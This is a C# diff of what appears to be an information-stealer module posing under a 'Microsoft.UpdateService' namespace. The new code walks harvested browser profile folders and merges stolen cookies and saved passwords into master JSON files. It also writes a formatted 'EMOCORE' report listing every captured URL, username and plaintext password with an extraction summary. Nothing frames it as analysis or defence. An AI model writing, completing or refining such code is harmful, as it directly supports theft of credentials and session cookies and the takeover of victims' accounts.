@@ -121,64 +121,82 @@ namespace Microsoft.UpdateService.Modules
             int totalCookies = 0;
             int totalPasswords = 0;
             var allCookies = new JArray();
-            var allPasswords = new StringBuilder();
-            allPasswords.AppendLine("================================================================================");
-            allPasswords.AppendLine("                           CONSOLIDATED PASSWORDS                               ");
-            allPasswords.AppendLine("================================================================================" + Environment.NewLine);
+            var allPasswords = new JArray();
+            
+            var aestheticReport = new StringBuilder();
+            aestheticReport.AppendLine("================================================================================");
+            aestheticReport.AppendLine("🚀 EMOCORE v1: CONSOLIDATED BROWSER SECRETS REPORT");
+            aestheticReport.AppendLine("================================================================================" + Environment.NewLine);
  
             try
             {
                 if (!Directory.Exists(rootDir)) return (0, 0);
-                var files = Directory.GetFiles(rootDir, "*.*", SearchOption.AllDirectories);
-                var processedFiles = new HashSet<string>();
- 
-                foreach (var file in files)
+                
+                // Get all subdirectories (browsers/profiles)
+                var browserDirs = Directory.GetDirectories(rootDir);
+                foreach (var browserDir in browserDirs)
                 {
-                    string name = Path.GetFileName(file).ToLower();
-                    if (name.Contains("vanguard_all_")) continue; // Skip already consolidated
-                    
-                    // Cookies consolidation
-                    if (name.Contains("cookie") && name.EndsWith(".json"))
+                    string browserName = Path.GetFileName(browserDir).ToUpper();
+                    foreach (var profileDir in Directory.GetDirectories(browserDir))
                     {
-                        try {
-                            string content = File.ReadAllText(file);
-                            if (content.Trim().StartsWith("["))
-                            {
-                                var json = JArray.Parse(content);
-                                foreach (var item in json) {
-                                    // Basic de-duplication heuristic: domain + name + path
-                                    allCookies.Add(item);
-                                }
+                        string profileName = Path.GetFileName(profileDir);
+                        bool profileHasData = false;
+
+                        // 1. Process Cookies
+                        string cookieFile = Path.Combine(profileDir, "cookies.json");
+                        if (File.Exists(cookieFile)) {
+                            try {
+                                var json = JArray.Parse(File.ReadAllText(cookieFile));
+                                foreach (var c in json) allCookies.Add(c);
                                 totalCookies += json.Count;
-                            }
-                        } catch { }
-                    }
-                    // Passwords consolidation
-                    else if (name.Contains("pass") || name.EndsWith(".txt") || name.EndsWith(".log"))
-                    {
-                        try {
-                            string content = File.ReadAllText(file);
-                            // Look for typical password file signatures
-                            if (content.Contains("URL:") || content.Contains("Password:") || content.Contains("User:")) 
-                            {
-                                string parentDir = Path.GetFileName(Path.GetDirectoryName(file)) ?? "Unknown";
-                                allPasswords.AppendLine($"--- SOURCE: {parentDir} ({name}) ---");
-                                allPasswords.AppendLine(content);
-                                allPasswords.AppendLine(Environment.NewLine);
-                                
-                                // Count unique password entries
-                                int matches = Regex.Matches(content, @"^URL:\s+", RegexOptions.Multiline | RegexOptions.IgnoreCase).Count;
-                                totalPasswords += (matches > 0 ? matches : 1);
-                            }
-                        } catch { }
+                            } catch { }
+                        }
+
+                        // 2. Process Passwords
+                        var passwordFiles = Directory.GetFiles(profileDir, "passwords*.json");
+                        foreach (var pFile in passwordFiles) {
+                            try {
+                                var json = JArray.Parse(File.ReadAllText(pFile));
+                                if (json.Count > 0) {
+                                    if (!profileHasData) {
+                                        aestheticReport.AppendLine($"📂 [BROWSER: {browserName} | PROFILE: {profileName}]");
+                                        aestheticReport.AppendLine("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
+                                        profileHasData = true;
+                                    }
+
+                                    foreach (var p in json) {
+                                        allPasswords.Add(p);
+                                        totalPasswords++;
+                                        
+                                        string url = p["url"]?.ToString() ?? "N/A";
+                                        string user = p["user"]?.ToString() ?? "N/A";
+                                        string pass = p["pass"]?.ToString() ?? "N/A";
+
+                                        aestheticReport.AppendLine($"🌐 URL:      {url}");
+                                        aestheticReport.AppendLine($"👤 User:     {user}");
+                                        aestheticReport.AppendLine($"🔑 Password: {pass}");
+                                        aestheticReport.AppendLine("--------------------------------------------------------------------------------");
+                                    }
+                                }
+                            } catch { }
+                        }
+                        
+                        if (profileHasData) aestheticReport.AppendLine(Environment.NewLine);
                     }
                 }
- 
+
+                // Write Master Files
                 if (totalCookies > 0)
-                    File.WriteAllText(Path.Combine(rootDir, Constants.COOKIE_FILE_NAME), allCookies.ToString());
+                    File.WriteAllText(Path.Combine(rootDir, "all_cookies.json"), allCookies.ToString());
                 
-                if (totalPasswords > 0)
-                    File.WriteAllText(Path.Combine(rootDir, Constants.PASSWORD_FILE_NAME), allPasswords.ToString());
+                if (totalPasswords > 0) {
+                    File.WriteAllText(Path.Combine(rootDir, "all_passwords.json"), allPasswords.ToString());
+                    
+                    aestheticReport.AppendLine("================================================================================");
+                    aestheticReport.AppendLine($"✅ EXTRACTION SUMMARY: {totalCookies} Cookies | {totalPasswords} Passwords");
+                    aestheticReport.AppendLine("================================================================================");
+                    File.WriteAllText(Path.Combine(rootDir, "AESTHETIC_REPORT.txt"), aestheticReport.ToString());
+                }
             }
             catch (Exception ex) { Log($"[BROWSER] Consolidation error: {ex.Message}"); }
  
